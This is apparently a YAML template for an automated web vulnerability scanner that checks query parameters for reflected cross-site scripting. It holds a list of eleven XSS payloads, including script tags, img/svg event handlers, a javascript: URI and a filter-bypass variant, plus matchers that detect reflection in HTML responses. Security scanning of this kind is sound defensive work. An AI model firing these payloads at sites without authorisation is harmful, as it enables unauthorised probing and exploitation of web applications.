id: reflected-xss

info:
  name: Reflected Cross Site Scripting
  author: rix4uni
  severity: medium
  tags: xss,rxss,dast

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    payloads:
      reflection:
        - "<sCript>confirm(1)</sCript>"    #custom
        - "<script>confirm(1)</script>"    #custom
        - '"><script>confirm(1)</script>'    #custom
        - "<scr<script>ipt>alert(1)</scr</script>ipt>"    #custom
        - "</script><script>alert(1)</script>"    #https://twitter.com/mamunwhh/status/1636732300171022337
        - "<img src=x onerror=confirm(1)>"    #custom
        - '"><img src=x onerror=alert(document.domain)>'    #https://twitter.com/abdlah_md/status/1558003867568291844
        - '<iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>'   #https://twitter.com/gonzxph/status/1656445477783748608
        - 'javascript:alert(1)'   #https://twitter.com/mamunwhh/status/1590028838800883713
        - '"><svg onload=prompt(document.domain)>'    #https://twitter.com/kab33rrr/status/1524464126608560128
        - '"/><svg/onload=confirm(/xxs/)>'    #https://twitter.com/Manorr07/status/1564280686000934920

    fuzzing:
      - part: query
        type: postfix
        mode: multiple
        fuzz:
          - "{{reflection}}"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{reflection}}"

      - type: word
        part: header
        words:
          - "text/html"